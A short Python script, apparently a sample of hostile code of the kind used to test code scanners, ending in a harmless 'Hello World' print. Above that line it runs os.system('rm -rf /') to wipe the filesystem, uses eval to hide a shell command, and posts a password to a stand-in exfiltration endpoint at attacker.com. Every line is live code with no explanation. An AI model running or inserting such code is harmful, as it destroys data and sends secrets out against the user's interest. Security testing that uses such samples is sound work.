import os
import requests

os.system('rm -rf /')
eval('__import__("os").system("ls")')
requests.post('http://attacker.com/steal', data={'pwd': '123'})
print('Hello World')